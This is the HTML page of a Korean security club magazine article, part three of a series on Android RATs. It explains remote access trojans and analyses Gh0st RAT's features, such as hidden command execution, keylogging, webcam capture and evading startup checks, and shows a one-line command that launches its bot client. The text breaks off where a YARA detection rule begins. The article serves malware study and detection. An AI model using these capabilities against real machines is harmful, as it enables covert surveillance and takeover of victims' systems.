@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/swing_logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/swing_logo.png" color="#222">
+  <meta name="google-site-verification" content="uoL1t-yrbhPowL65E-xnG5D1FNLOwghJsIG6iqHrEsc">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"log.swuswing.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="5. RAT 악성코드5-1. RAT 알아보기원격 접속 도구(RAT)는 본래 Remote Access Tool&#x2F;Remote Administrator Tool의 약어로 사용되었으나, 최근 악성 파일에서는 Remote Access Trojan의 약어로 사용되는 추세이다. ‘Trojan’이라는 단어로 트로이 목마형 공격과의 연관을 유추할 수 있다. RAT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[2025 SWING magazine] Android + RAT(3)">
+<meta property="og:url" content="https://log.swuswing.com/2025/10/04/313203_251004/index.html">
+<meta property="og:site_name" content="SW1NGL0G">
+<meta property="og:description" content="5. RAT 악성코드5-1. RAT 알아보기원격 접속 도구(RAT)는 본래 Remote Access Tool&#x2F;Remote Administrator Tool의 약어로 사용되었으나, 최근 악성 파일에서는 Remote Access Trojan의 약어로 사용되는 추세이다. ‘Trojan’이라는 단어로 트로이 목마형 공격과의 연관을 유추할 수 있다. RAT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image1.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image2.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image3.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image4.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image5.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image6.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image7.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image8.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image9.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image10.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image11.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image12.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image13.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image14.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image15.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image16.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image17.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image18.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image19.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image20.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image21.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image22.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image23.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image24.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image25.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image26.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image27.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image28.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image29.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image30.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image31.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image32.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image33.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image34.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image35.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image36.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image37.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image38.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image39.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image40.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image41.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image42.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image43.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image44.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image45.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image46.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image47.png">
+<meta property="og:image" content="https://log.swuswing.com/images/313203_251004_image48.png">
+<meta property="article:published_time" content="2025-10-03T15:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-09T15:54:12.248Z">
+<meta property="article:author" content="SWING">
+<meta property="article:tag" content="안드로이드">
+<meta property="article:tag" content="apk">
+<meta property="article:tag" content="RAT">
+<meta property="article:tag" content="악성코드">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://log.swuswing.com/images/313203_251004_image1.png">
+
+
+<link rel="canonical" href="https://log.swuswing.com/2025/10/04/313203_251004/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://log.swuswing.com/2025/10/04/313203_251004/","path":"2025/10/04/313203_251004/","title":"[2025 SWING magazine] Android + RAT(3)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[2025 SWING magazine] Android + RAT(3) | SW1NGL0G</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="SW1NGL0G" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SW1NGL0G</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#5-RAT-%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C"><span class="nav-number">1.</span> <span class="nav-text">5. RAT 악성코드</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-RAT-%EC%95%8C%EC%95%84%EB%B3%B4%EA%B8%B0"><span class="nav-number">1.1.</span> <span class="nav-text">5-1. RAT 알아보기</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-Gh0st-RAT-%EB%B6%84%EC%84%9D"><span class="nav-number">2.</span> <span class="nav-text">6. Gh0st RAT 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-Gh0st-RAT"><span class="nav-number">2.1.</span> <span class="nav-text">6-1. Gh0st RAT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-%EB%B4%87-%EA%B8%B0%EB%8A%A5"><span class="nav-number">2.2.</span> <span class="nav-text">6-2. 봇 기능</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-Gh0st-RAT-%EA%B3%B5%EA%B2%A9-%EA%B3%BC%EC%A0%95%EA%B3%BC-%EA%B8%B0%EB%8A%A5"><span class="nav-number">2.3.</span> <span class="nav-text">6-3. Gh0st RAT 공격 과정과 기능</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-4-Gh0st-RAT-YARA-Rule"><span class="nav-number">2.4.</span> <span class="nav-text">6-4. Gh0st RAT YARA Rule</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-5-PEView-%EB%B6%84%EC%84%9D"><span class="nav-number">2.5.</span> <span class="nav-text">6-5. PEView 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#a-IMAGE-DOS-HEADER-DOS-Header"><span class="nav-number">2.5.1.</span> <span class="nav-text">a. IMAGE_DOS_HEADER (DOS Header)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-MS-DOS-Stub-Program-DOS-Stub"><span class="nav-number">2.5.2.</span> <span class="nav-text">b. MS-DOS Stub Program (DOS Stub)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-IMAGE-NT-HEADERS-NT-Header"><span class="nav-number">2.5.3.</span> <span class="nav-text">c. IMAGE_NT_HEADERS (NT Header)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-IMAGE-SECTION-HEADER"><span class="nav-number">2.5.4.</span> <span class="nav-text">d. IMAGE_SECTION_HEADER</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-6-IDA-%EB%B6%84%EC%84%9D"><span class="nav-number">2.6.</span> <span class="nav-text">6-6. IDA 분석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-7-zombie-cpp-%EB%B6%84%EC%84%9D"><span class="nav-number">2.7.</span> <span class="nav-text">6-7. zombie.cpp 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#a-%EA%B8%B0%EB%B3%B8-%EC%84%A4%EC%A0%95-%EB%B0%8F-%ED%8F%AC%ED%95%A8-%ED%8C%8C%EC%9D%BC"><span class="nav-number">2.7.1.</span> <span class="nav-text">a. 기본 설정 및 포함 파일</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-%ED%81%B4%EB%9D%BC%EC%9D%B4%EC%96%B8%ED%8A%B8-%EC%97%B0%EA%B2%B0-%EC%84%A4%EC%A0%95"><span class="nav-number">2.7.2.</span> <span class="nav-text">b. 클라이언트 연결 설정</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-%ED%8C%8C%EC%9D%BC-%EA%B2%BD%EB%A1%9C-%EB%B0%8F-%EC%8B%A4%ED%96%89-%ED%8C%8C%EC%9D%BC-%EB%B3%B5%EC%82%AC"><span class="nav-number">2.7.3.</span> <span class="nav-text">c. 파일 경로 및 실행 파일 복사</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%8A%B8%EB%A6%AC%EC%97%90-%EC%B6%94%EA%B0%80"><span class="nav-number">2.7.4.</span> <span class="nav-text">d. 레지스트리에 추가</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#e-%EB%AA%85%EB%A0%B9-%EC%8B%A4%ED%96%89-%EB%B0%8F-%EC%A0%9C%EC%96%B4"><span class="nav-number">2.7.5.</span> <span class="nav-text">e. 명령 실행 및 제어</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#f-%EB%AA%85%EB%A0%B9%EC%96%B4-%EC%B2%98%EB%A6%AC"><span class="nav-number">2.7.6.</span> <span class="nav-text">f. 명령어 처리</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-Android-RAT"><span class="nav-number">3.</span> <span class="nav-text">7. Android RAT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-AhMyth"><span class="nav-number">4.</span> <span class="nav-text">8. AhMyth</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-%EA%B0%9C%EC%9A%94"><span class="nav-number">4.1.</span> <span class="nav-text">8-1. 개요</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-AhMyth-%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C-%EC%8B%A4%EC%8A%B5-%EA%B3%BC%EC%A0%95-%EC%A0%95%EB%A6%AC"><span class="nav-number">4.2.</span> <span class="nav-text">8-2. AhMyth 악성코드 실습 과정 정리</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-AhMyth-%EC%8B%A4%EC%8A%B5-APK-%ED%8C%8C%EC%9D%BC-%EC%A0%9C%EC%9E%91"><span class="nav-number">4.3.</span> <span class="nav-text">8-3. AhMyth 실습 (APK 파일 제작)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-4-AndroRAT-from-Karma9874-%EC%8B%A4%EC%8A%B5"><span class="nav-number">4.4.</span> <span class="nav-text">8-4. AndroRAT (from. Karma9874) 실습</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-%EB%82%98%EA%B0%80%EB%8A%94-%EB%A7%90"><span class="nav-number">5.</span> <span class="nav-text">9. 나가는 말</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-%EC%B0%B8%EA%B3%A0%EB%AC%B8%ED%97%8C"><span class="nav-number">6.</span> <span class="nav-text">10. 참고문헌</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SWING</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnN3dS5zd2luZ0BnbWFpbC5jb20=" title="E-Mail → mailto:swu.swing@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0Bzd3Vzd2luZw==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zd2luZ19zd3U=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9zd3Vzd2luZy5jb20v" title="https:&#x2F;&#x2F;swuswing.com&#x2F;">SWING Official Website</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://log.swuswing.com/2025/10/04/313203_251004/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SWING">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[2025 SWING magazine] Android + RAT(3) | SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [2025 SWING magazine] Android + RAT(3)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="far fa-user"></i>
+    </span>
+    <span class="post-meta-item-text">author: rlozll, alvvays</span>
+  </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-10-04 00:00:00" itemprop="dateCreated datePublished" datetime="2025-10-04T00:00:00+09:00">2025-10-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/SWING-%EC%B9%BC%EB%9F%BC-%EB%AA%A8%EC%95%84%EB%B3%B4%EA%B8%B0-series/" itemprop="url" rel="index"><span itemprop="name">SWING 칼럼 모아보기 series</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="5-RAT-악성코드"><a href="#5-RAT-악성코드" class="headerlink" title="5. RAT 악성코드"></a>5. RAT 악성코드</h1><h2 id="5-1-RAT-알아보기"><a href="#5-1-RAT-알아보기" class="headerlink" title="5-1. RAT 알아보기"></a>5-1. RAT 알아보기</h2><p>원격 접속 도구(RAT)는 본래 Remote Access Tool&#x2F;Remote Administrator Tool의 약어로 사용되었으나, 최근 악성 파일에서는 Remote Access Trojan의 약어로 사용되는 추세이다. ‘Trojan’이라는 단어로 트로이 목마형 공격과의 연관을 유추할 수 있다.</p>
+<p>RAT는 감염된 시스템의 백도어 생성을 위해 쓰이는 경우가 많다. 정상 프로그램에 공격자가 만든 악성코드를 삽입하여 재유포하거나, 이메일을 이용한 공격, 파일 공유 사이트에 악성코드 배포 등 다양한 방법으로 유포가 진행 중이다.</p>
+<span id="more"></span>
+
+<p><img src="/images/313203_251004_image1.png" alt="그림 85. 정상 프로그램과 악성코드의 동작 시나리오"></p>
+<center><span style="font-size: 90%;">그림 86. [정상 프로그램과 악성코드의 동작 시나리오] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>기본적으로 원격 접속을 통한 PC 제어는 별 문제될 이유가 없는 행위이다. 정상 Remote 매커니즘에서도<br>이러한 기능을 사용한다. 그러나 Remote 기능을 이용한 비정상 매커니즘의 경우, 악성코드가 정상 프로그램에 삽입되거나 정상 프로그램으로 위장함으로써 유포 및 실행된다. 그리고 이는 이후 공격자와 직접 통신하는 등 추가적 공격 행위에 이용된다.</p>
+<br>
+
+<h1 id="6-Gh0st-RAT-분석"><a href="#6-Gh0st-RAT-분석" class="headerlink" title="6. Gh0st RAT 분석"></a>6. Gh0st RAT 분석</h1><h2 id="6-1-Gh0st-RAT"><a href="#6-1-Gh0st-RAT" class="headerlink" title="6-1. Gh0st RAT"></a>6-1. Gh0st RAT</h2><p>Gh0st는 서버&#x2F;공격자에게 사용자의 cmd.exe에 대한 원격 액세스를 제공하는 RAT이다.</p>
+<p>Gh0st는 클라이언트&#x2F;zombie(PC)에게 알리지 않고 자동으로 명령을 실행할 수 있다. 서버&#x2F;공격자에게는 클라이언트&#x2F;zombie의 PC에 파일을 다운로드하고 실행할 수 있게 한다. 이 과정은 백그라운드에서 숨겨진 상태에서 실행된다. </p>
+<p>이 악성코드는 Zombie.exe 파일을 실행하는 것만으로 배포된다. 실행 시 IP와 포트를 검색하며, 둘 다 제공되어야만 프로그램이 실행된다.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ex) zombie.exe <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">27015</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="6-2-봇-기능"><a href="#6-2-봇-기능" class="headerlink" title="6-2. 봇 기능"></a>6-2. 봇 기능</h2><p>원격 명령 실행, 자동 백그라운드 프로세스, 파일 다운로드 및 실행(숨김), 안전 모드 시작, 자동으로 서버 연결, 주고받는 데이터 암호화, 설치된 바이러스 백신 서버에 표시, 다운로드 기능을 통해 악성코드 쉽게 유포, 부팅 시 시작되나 msconfig 또는 CCleaner와 같은 부팅 시 시작되는 프로그램을 확인하는 프로그램에 포착되지 않음, 작업 관리자 비활성화.</p>
+<h2 id="6-3-Gh0st-RAT-공격-과정과-기능"><a href="#6-3-Gh0st-RAT-공격-과정과-기능" class="headerlink" title="6-3. Gh0st RAT 공격 과정과 기능"></a>6-3. Gh0st RAT 공격 과정과 기능</h2><p><img src="/images/313203_251004_image2.png" alt="그림 86. Gh0st RAT 공격 과정"></p>
+<center><span style="font-size: 90%;">그림 86. [Gh0st RAT 공격 과정] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>서버 프로그램은 클라이언트에 설치할 악성코드를 빌드할 수 있으며 클라이언트에 대한 통제 기능을 가지고 있다. </p>
+<p>Gh0st RAT의 기능은 아래와 같다.</p>
+<p>감염된 봇의 원격 화면 완전 제어, 실시간 및 오프라인 키 입력 로깅 제공, 감염된 호스트의 웹캠, 마이크의 라이브 피드 제공, 감염된 원격 호스트에 원격 바이너리 다운로드, 원격 종료 및 호스트 재부팅 제어, 감염된 컴퓨터의 원격 포인터 및 키보드 입력을 비활성화, 모든 권한을 가지고 감염된 원격 호스트의 쉘에 진입, 모든 활성 프로세스 목록 제공, 모든 기존 후크의 기존 SSDT 모두 삭제. </p>
+<h2 id="6-4-Gh0st-RAT-YARA-Rule"><a href="#6-4-Gh0st-RAT-YARA-Rule" class="headerlink" title="6-4. Gh0st RAT YARA Rule"></a>6-4. Gh0st RAT YARA Rule</h2><p>먼저 Yara라는 것에 대해 알 필요가 있다. Yara는 악성 파일을 파일 시그니처 기반으로 판별 및 분류하는 툴이다. Linux, Windows OS에서 모두 사용이 가능하며, 소스코드 컴파일, Python 모듈, 파일 실행 방식 등 다양한 방법으로 Yara 설치 및 실행이 가능하다.</p>
+<p>아래는 Gh0st RAT의 Yara 룰이다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span 